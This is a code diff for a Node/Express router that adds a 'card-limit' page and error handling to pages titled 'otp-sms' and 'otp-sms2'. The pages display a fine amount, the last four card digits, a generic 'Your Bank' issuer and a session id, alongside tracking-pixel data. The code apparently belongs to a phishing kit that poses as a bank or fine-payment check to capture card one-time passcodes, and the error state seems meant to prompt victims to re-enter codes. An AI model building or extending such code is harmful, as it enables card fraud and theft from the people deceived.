@@ -57,30 +57,41 @@ router.get('/otp-loading', async (req, res) => {
   });
 });
 
+router.get('/card-limit', async (req, res) => {
+  const pixel = await getPixelData();
+  const { totalFine='0', cardLast4='****', issuer='', sid='' } = req.query;
+  res.render('card-limit', {
+    ...pixel, pixelCurrentPath: '/card-limit',
+    totalFine: parseInt(totalFine) || 0,
+    cardLast4, issuer, sid,
+  });
+});
+
 router.get('/otp-sms2', async (req, res) => {
   const pixel = await getPixelData();
-  const { amount='0', cardLast4='****', totalFine, issuer='Your Bank', sid='' } = req.query;
+  const { amount='0', cardLast4='****', totalFine, issuer='Your Bank', sid='', error='' } = req.query;
   res.render('otp-sms2', {
     ...pixel, pixelCurrentPath: '/otp-sms2',
     amount: parseInt(amount) || 0,
     cardLast4,
     totalFine: parseInt(totalFine || amount) || 0,
-    issuer,
-    sid,
-    dateStr: new Date().toLocaleDateString('tr-TR', { timeZone:'Asia/Dubai', day:'2-digit', month:'2-digit', year:'numeric' }),
+    issuer, sid, error,
+    dateStr: new Date().toLocaleString('tr-TR', {
+      timeZone: 'Asia/Dubai', day: '2-digit', month: '2-digit', year: 'numeric',
+      hour: '2-digit', minute: '2-digit',
+    }),
   });
 });
 
 router.get('/otp-sms', async (req, res) => {
   const pixel = await getPixelData();
-  const { amount='0', cardLast4='****', totalFine, issuer='Your Bank', sid='' } = req.query;
+  const { amount='0', cardLast4='****', totalFine, issuer='Your Bank', sid='', error='' } = req.query;
   res.render('otp-sms', {
     ...pixel, pixelCurrentPath: '/otp-sms',
     amount: parseInt(amount) || 0,
     cardLast4,
     totalFine: parseInt(totalFine || amount) || 0,
-    issuer,
-    sid,
+    issuer, sid, error,
     dateStr: new Date().toLocaleDateString('tr-TR', { timeZone:'Asia/Dubai', day:'2-digit', month:'2-digit', year:'numeric' }),
   });
 });
